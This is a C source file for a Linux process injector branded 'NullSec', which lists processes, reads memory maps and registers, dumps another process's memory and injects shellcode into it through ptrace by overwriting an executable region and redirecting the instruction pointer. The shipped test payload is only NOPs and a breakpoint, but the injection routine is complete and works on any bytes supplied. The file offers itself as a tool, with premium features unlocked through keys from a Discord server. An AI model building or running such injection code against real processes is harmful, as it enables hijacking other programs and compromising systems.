/*
 * ═══════════════════════════════════════════════════════════════════
 *  NULLSEC LINUX C PROCESS INJECTOR
 *  Low-level process manipulation and injection
 *  @author bad-antics | discord.gg/killers
 * ═══════════════════════════════════════════════════════════════════
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <elf.h>
#include <errno.h>
#include <dirent.h>

#define VERSION "2.0.0"
#define AUTHOR "bad-antics"
#define DISCORD "discord.gg/killers"

#define COLOR_RESET   "\x1b[0m"
#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_CYAN    "\x1b[36m"

static const char *BANNER = 
    "\n"
    "╭──────────────────────────────────────────╮\n"
    "│      🐧 NULLSEC LINUX C INJECTOR        │\n"
    "│      ════════════════════════════       │\n"
    "│                                          │\n"
    "│   ⚡ Low-Level Process Manipulation     │\n"
    "│   📡 Ptrace-Based Injection             │\n"
    "│   💾 Shellcode Execution                │\n"
    "│                                          │\n"
    "│          bad-antics | NullSec            │\n"
    "╰──────────────────────────────────────────╯\n";

/* ═══════════════════════════════════════════════════════════════════
 * License Management
 * ═══════════════════════════════════════════════════════════════════ */

typedef enum {
    TIER_FREE,
    TIER_PREMIUM,
    TIER_ENTERPRISE
} LicenseTier;

typedef struct {
    char key[64];
    LicenseTier tier;
    int valid;
} License;

const char* tier_to_string(LicenseTier tier) {
    switch (tier) {
        case TIER_PREMIUM: return "Premium ⭐";
        case TIER_ENTERPRISE: return "Enterprise 💎";
        default: return "Free";
    }
}

License validate_license(const char *key) {
    License license = {0};
    
    if (!key || strlen(key) != 24) {
        return license;
    }
    
    if (strncmp(key, "NLIN-", 5) != 0) {
        return license;
    }
    
    strncpy(license.key, key, sizeof(license.key) - 1);
    
    if (strncmp(key + 5, "PR", 2) == 0) {
        license.tier = TIER_PREMIUM;
    } else if (strncmp(key + 5, "EN", 2) == 0) {
        license.tier = TIER_ENTERPRISE;
    } else {
        license.tier = TIER_FREE;
    }
    
    license.valid = 1;
    return license;
}

int is_premium(License *license) {
    return license->valid && license->tier != TIER_FREE;
}

/* ═══════════════════════════════════════════════════════════════════
 * Console Helpers
 * ═══════════════════════════════════════════════════════════════════ */

void print_success(const char *msg) {
    printf(COLOR_GREEN "✅ %s" COLOR_RESET "\n", msg);
}

void print_error(const char *msg) {
    printf(COLOR_RED "❌ %s" COLOR_RESET "\n", msg);
}

void print_warning(const char *msg) {
    printf(COLOR_YELLOW "⚠️  %s" COLOR_RESET "\n", msg);
}

void print_info(const char *msg) {
    printf(COLOR_CYAN "ℹ️  %s" COLOR_RESET "\n", msg);
}

void print_header(const char *title) {
    printf("\n═══════════════════════════════════════════\n");
    printf("  %s\n", title);
    printf("═══════════════════════════════════════════\n\n");
}

/* ═══════════════════════════════════════════════════════════════════
 * Process Information
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct {
    pid_t pid;
    char name[256];
    char state;
    uid_t uid;
    unsigned long vm_size;
    unsigned long vm_rss;
} ProcessInfo;

int get_process_info(pid_t pid, ProcessInfo *info) {
    char path[64];
    char buffer[4096];
    FILE *fp;
    
    memset(info, 0, sizeof(ProcessInfo));
    info->pid = pid;
    
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    fp = fopen(path, "r");
    if (!fp) return -1;
    
    while (fgets(buffer, sizeof(buffer), fp)) {
        if (strncmp(buffer, "Name:", 5) == 0) {
            sscanf(buffer + 6, "%255s", info->name);
        } else if (strncmp(buffer, "State:", 6) == 0) {
            sscanf(buffer + 7, "%c", &info->state);
        } else if (strncmp(buffer, "Uid:", 4) == 0) {
            sscanf(buffer + 5, "%d", &info->uid);
        } else if (strncmp(buffer, "VmSize:", 7) == 0) {
            sscanf(buffer + 8, "%lu", &info->vm_size);
        } else if (strncmp(buffer, "VmRSS:", 6) == 0) {
            sscanf(buffer + 7, "%lu", &info->vm_rss);
        }
    }
    
    fclose(fp);
    return 0;
}

void list_processes(void) {
    print_header("📊 RUNNING PROCESSES");
    
    DIR *dir = opendir("/proc");
    if (!dir) {
        print_error("Cannot open /proc");
        return;
    }
    
    printf("  %6s  %-20s  %5s  %12s\n", "PID", "NAME", "STATE", "MEMORY (KB)");
    printf("  %s\n", "────────────────────────────────────────────────");
    
    struct dirent *entry;
    int count = 0;
    
    while ((entry = readdir(dir)) != NULL && count < 30) {
        pid_t pid = atoi(entry->d_name);
        if (pid > 0) {
            ProcessInfo info;
            if (get_process_info(pid, &info) == 0) {
                printf("  %6d  %-20s  %5c  %12lu\n",
                    info.pid, info.name, info.state, info.vm_rss);
                count++;
            }
        }
    }
    
    closedir(dir);
    printf("\n");
}

pid_t find_process_by_name(const char *name) {
    DIR *dir = opendir("/proc");
    if (!dir) return -1;
    
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL) {
        pid_t pid = atoi(entry->d_name);
        if (pid > 0) {
            ProcessInfo info;
            if (get_process_info(pid, &info) == 0) {
                if (strcmp(info.name, name) == 0) {
                    closedir(dir);
                    return pid;
                }
            }
        }
    }
    
    closedir(dir);
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════
 * Memory Maps Analysis
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct {
    unsigned long start;
    unsigned long end;
    char perms[5];
    char pathname[256];
} MemoryRegion;

int get_memory_maps(pid_t pid, MemoryRegion *regions, int max_regions) {
    char path[64];
    char line[512];
    FILE *fp;
    int count = 0;
    
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    fp = fopen(path, "r");
    if (!fp) return -1;
    
    while (fgets(line, sizeof(line), fp) && count < max_regions) {
        MemoryRegion *region = &regions[count];
        
        int n = sscanf(line, "%lx-%lx %4s %*x %*x:%*x %*d %255s",
            &region->start, &region->end, region->perms, region->pathname);
        
        if (n >= 3) {
            if (n < 4) region->pathname[0] = '\0';
            count++;
        }
    }
    
    fclose(fp);
    return count;
}

void display_memory_maps(pid_t pid) {
    print_header("🗺️  MEMORY MAPS");
    
    MemoryRegion regions[256];
    int count = get_memory_maps(pid, regions, 256);
    
    if (count < 0) {
        print_error("Cannot read memory maps");
        return;
    }
    
    printf("  %-18s %-18s %-5s %s\n", "START", "END", "PERMS", "PATHNAME");
    printf("  %s\n", "────────────────────────────────────────────────────────────────");
    
    for (int i = 0; i < count && i < 30; i++) {
        printf("  0x%016lx 0x%016lx %-5s %s\n",
            regions[i].start, regions[i].end, regions[i].perms, regions[i].pathname);
    }
    
    printf("\n  Total regions: %d\n\n", count);
}

/* ═══════════════════════════════════════════════════════════════════
 * Ptrace Operations
 * ═══════════════════════════════════════════════════════════════════ */

int attach_process(pid_t pid) {
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace attach");
        return -1;
    }
    
    int status;
    waitpid(pid, &status, 0);
    
    if (WIFSTOPPED(status)) {
        return 0;
    }
    
    return -1;
}

int detach_process(pid_t pid) {
    return ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

long read_memory(pid_t pid, unsigned long addr) {
    return ptrace(PTRACE_PEEKDATA, pid, addr, NULL);
}

int write_memory(pid_t pid, unsigned long addr, long data) {
    return ptrace(PTRACE_POKEDATA, pid, addr, data);
}

int read_memory_buffer(pid_t pid, unsigned long addr, void *buffer, size_t len) {
    long *ptr = (long *)buffer;
    size_t i;
    
    for (i = 0; i < len / sizeof(long); i++) {
        errno = 0;
        ptr[i] = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
        if (errno != 0) return -1;
    }
    
    return 0;
}

int write_memory_buffer(pid_t pid, unsigned long addr, void *buffer, size_t len) {
    long *ptr = (long *)buffer;
    size_t i;
    
    for (i = 0; i < len / sizeof(long); i++) {
        if (ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), ptr[i]) < 0) {
            return -1;
        }
    }
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * Register Operations
 * ═══════════════════════════════════════════════════════════════════ */

int get_registers(pid_t pid, struct user_regs_struct *regs) {
    return ptrace(PTRACE_GETREGS, pid, NULL, regs);
}

int set_registers(pid_t pid, struct user_regs_struct *regs) {
    return ptrace(PTRACE_SETREGS, pid, NULL, regs);
}

void display_registers(pid_t pid) {
    print_header("📝 REGISTERS");
    
    struct user_regs_struct regs;
    
    if (attach_process(pid) < 0) {
        print_error("Cannot attach to process");
        return;
    }
    
    if (get_registers(pid, &regs) < 0) {
        print_error("Cannot read registers");
        detach_process(pid);
        return;
    }
    
#ifdef __x86_64__
    printf("  RAX: 0x%016llx    RBX: 0x%016llx\n", regs.rax, regs.rbx);
    printf("  RCX: 0x%016llx    RDX: 0x%016llx\n", regs.rcx, regs.rdx);
    printf("  RSI: 0x%016llx    RDI: 0x%016llx\n", regs.rsi, regs.rdi);
    printf("  RBP: 0x%016llx    RSP: 0x%016llx\n", regs.rbp, regs.rsp);
    printf("  R8:  0x%016llx    R9:  0x%016llx\n", regs.r8, regs.r9);
    printf("  R10: 0x%016llx    R11: 0x%016llx\n", regs.r10, regs.r11);
    printf("  R12: 0x%016llx    R13: 0x%016llx\n", regs.r12, regs.r13);
    printf("  R14: 0x%016llx    R15: 0x%016llx\n", regs.r14, regs.r15);
    printf("  RIP: 0x%016llx    EFLAGS: 0x%016llx\n", regs.rip, regs.eflags);
#else
    printf("  EAX: 0x%08lx    EBX: 0x%08lx\n", regs.eax, regs.ebx);
    printf("  ECX: 0x%08lx    EDX: 0x%08lx\n", regs.ecx, regs.edx);
    printf("  ESI: 0x%08lx    EDI: 0x%08lx\n", regs.esi, regs.edi);
    printf("  EBP: 0x%08lx    ESP: 0x%08lx\n", regs.ebp, regs.esp);
    printf("  EIP: 0x%08lx    EFLAGS: 0x%08lx\n", regs.eip, regs.eflags);
#endif
    
    detach_process(pid);
    printf("\n");
}

/* ═══════════════════════════════════════════════════════════════════
 * Memory Dump
 * ═══════════════════════════════════════════════════════════════════ */

void hexdump(unsigned long addr, void *data, size_t len) {
    unsigned char *ptr = (unsigned char *)data;
    
    for (size_t i = 0; i < len; i += 16) {
        printf("  0x%016lx: ", addr + i);
        
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            printf("%02x ", ptr[i + j]);
        }
        
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            unsigned char c = ptr[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("|\n");
    }
}

void dump_memory(pid_t pid, unsigned long addr, size_t len, License *license) {
    print_header("💾 MEMORY DUMP");
    
    if (!is_premium(license)) {
        print_warning("Premium feature - Get keys at " DISCORD);
        printf("\n");
        return;
    }
    
    unsigned char *buffer = malloc(len);
    if (!buffer) {
        print_error("Memory allocation failed");
        return;
    }
    
    if (attach_process(pid) < 0) {
        print_error("Cannot attach to process");
        free(buffer);
        return;
    }
    
    if (read_memory_buffer(pid, addr, buffer, len) < 0) {
        print_error("Cannot read memory");
        detach_process(pid);
        free(buffer);
        return;
    }
    
    hexdump(addr, buffer, len);
    
    detach_process(pid);
    free(buffer);
    printf("\n");
}

/* ═══════════════════════════════════════════════════════════════════
 * Shellcode Injection (Premium)
 * ═══════════════════════════════════════════════════════════════════ */

int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t len, License *license) {
    if (!is_premium(license)) {
        print_warning("Premium feature - Get keys at " DISCORD);
        return -1;
    }
    
    print_header("💉 SHELLCODE INJECTION");
    
    printf("  Target PID: %d\n", pid);
    printf("  Shellcode size: %zu bytes\n\n", len);
    
    if (attach_process(pid) < 0) {
        print_error("Cannot attach to process");
        return -1;
    }
    
    // Get current registers
    struct user_regs_struct old_regs, regs;
    if (get_registers(pid, &old_regs) < 0) {
        print_error("Cannot get registers");
        detach_process(pid);
        return -1;
    }
    
    memcpy(&regs, &old_regs, sizeof(regs));
    
    // Find executable region
    MemoryRegion regions[256];
    int count = get_memory_maps(pid, regions, 256);
    
    unsigned long inject_addr = 0;
    for (int i = 0; i < count; i++) {
        if (regions[i].perms[2] == 'x') {
            inject_addr = regions[i].start;
            break;
        }
    }
    
    if (inject_addr == 0) {
        print_error("Cannot find executable region");
        detach_process(pid);
        return -1;
    }
    
    printf("  Injection address: 0x%lx\n", inject_addr);
    
    // Backup original code
    unsigned char *backup = malloc(len);
    read_memory_buffer(pid, inject_addr, backup, len);
    
    // Write shellcode
    if (write_memory_buffer(pid, inject_addr, shellcode, len) < 0) {
        print_error("Cannot write shellcode");
        free(backup);
        detach_process(pid);
        return -1;
    }
    
#ifdef __x86_64__
    regs.rip = inject_addr;
#else
    regs.eip = inject_addr;
#endif
    
    set_registers(pid, &regs);
    
    print_success("Shellcode injected");
    printf("  Original code backed up\n");
    printf("  Instruction pointer set to shellcode\n\n");
    
    // Continue execution
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    int status;
    waitpid(pid, &status, 0);
    
    // Restore original code
    write_memory_buffer(pid, inject_addr, backup, len);
    set_registers(pid, &old_regs);
    
    free(backup);
    detach_process(pid);
    
    print_success("Injection complete, original state restored");
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * Main Menu
 * ═══════════════════════════════════════════════════════════════════ */

void show_menu(License *license) {
    char input[256];
    pid_t current_pid = 0;
    
    while (1) {
        const char *tier_badge = is_premium(license) ? "⭐" : "🆓";
        
        printf("\n  📋 NullSec Linux C Injector %s\n\n", tier_badge);
        printf("  Current target PID: %d\n\n", current_pid);
        printf("  [1] List Processes\n");
        printf("  [2] Set Target PID\n");
        printf("  [3] Find Process by Name\n");
        printf("  [4] Memory Maps\n");
        printf("  [5] Register Dump\n");
        printf("  [6] Memory Dump (Premium)\n");
        printf("  [7] Inject Test Shellcode (Premium)\n");
        printf("  [8] Enter License Key\n");
        printf("  [0] Exit\n\n");
        
        printf("  Select: ");
        fflush(stdout);
        
        if (!fgets(input, sizeof(input), stdin)) break;
        
        switch (input[0]) {
            case '1':
                list_processes();
                break;
                
            case '2':
                printf("  Enter PID: ");
                fgets(input, sizeof(input), stdin);
                current_pid = atoi(input);
                if (current_pid > 0) {
                    ProcessInfo info;
                    if (get_process_info(current_pid, &info) == 0) {
                        printf("  Target set: %s (PID %d)\n", info.name, current_pid);
                    } else {
                        print_error("Process not found");
                        current_pid = 0;
                    }
                }
                break;
                
            case '3':
                printf("  Process name: ");
                fgets(input, sizeof(input), stdin);
                input[strcspn(input, "\n")] = 0;
                current_pid = find_process_by_name(input);
                if (current_pid > 0) {
                    printf("  Found: %s (PID %d)\n", input, current_pid);
                } else {
                    print_error("Process not found");
                }
                break;
                
            case '4':
                if (current_pid > 0) {
                    display_memory_maps(current_pid);
                } else {
                    print_warning("Set target PID first");
                }
                break;
                
            case '5':
                if (current_pid > 0) {
                    display_registers(current_pid);
                } else {
                    print_warning("Set target PID first");
                }
                break;
                
            case '6':
                if (current_pid > 0) {
                    unsigned long addr;
                    printf("  Address (hex): 0x");
                    fgets(input, sizeof(input), stdin);
                    addr = strtoul(input, NULL, 16);
                    dump_memory(current_pid, addr, 256, license);
                } else {
                    print_warning("Set target PID first");
                }
                break;
                
            case '7':
                if (current_pid > 0) {
                    // Simple NOP sled + int3 for testing
                    unsigned char test_shellcode[] = {
                        0x90, 0x90, 0x90, 0x90,  // NOP sled
                        0xcc,                     // INT3 (breakpoint)
                        0x90, 0x90, 0x90         // More NOPs
                    };
                    inject_shellcode(current_pid, test_shellcode, sizeof(test_shellcode), license);
                } else {
                    print_warning("Set target PID first");
                }
                break;
                
            case '8':
                printf("  License key: ");
                fgets(input, sizeof(input), stdin);
                input[strcspn(input, "\n")] = 0;
                *license = validate_license(input);
                if (license->valid) {
                    char msg[128];
                    snprintf(msg, sizeof(msg), "License activated: %s", tier_to_string(license->tier));
                    print_success(msg);
                } else {
                    print_warning("Invalid license key");
                }
                break;
                
            case '0':
                return;
                
            default:
                print_error("Invalid option");
        }
    }
}

/* ═══════════════════════════════════════════════════════════════════
 * Main Entry Point
 * ═══════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[]) {
    printf(COLOR_CYAN "%s" COLOR_RESET, BANNER);
    printf("  Version %s | %s\n", VERSION, AUTHOR);
    printf("  🔑 Premium: %s\n\n", DISCORD);
    
    License license = {0};
    
    // Parse command line args
    for (int i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-k") == 0 || strcmp(argv[i], "--key") == 0) && i + 1 < argc) {
            license = validate_license(argv[++i]);
            if (license.valid) {
                char msg[128];
                snprintf(msg, sizeof(msg), "License activated: %s", tier_to_string(license.tier));
                print_success(msg);
            }
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("  Usage: %s [options]\n\n", argv[0]);
            printf("  Options:\n");
            printf("    -k, --key KEY    License key\n");
            printf("    -h, --help       Show help\n");
            printf("    -v, --version    Show version\n");
            return 0;
        } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0) {
            printf("  NullSec Linux C Injector v%s\n", VERSION);
            return 0;
        }
    }
    
    // Check if running as root
    if (getuid() != 0) {
        print_warning("Running as non-root user - some features may not work");
        printf("    Run with sudo for full functionality\n\n");
    }
    
    show_menu(&license);
    
    // Footer
    printf("\n─────────────────────────────────────────\n");
    printf("  🐧 NullSec Linux C Injector\n");
    printf("  🔑 Premium: %s\n", DISCORD);
    printf("  👤 Author: %s\n", AUTHOR);
    printf("─────────────────────────────────────────\n\n");
    
    return 0;
}
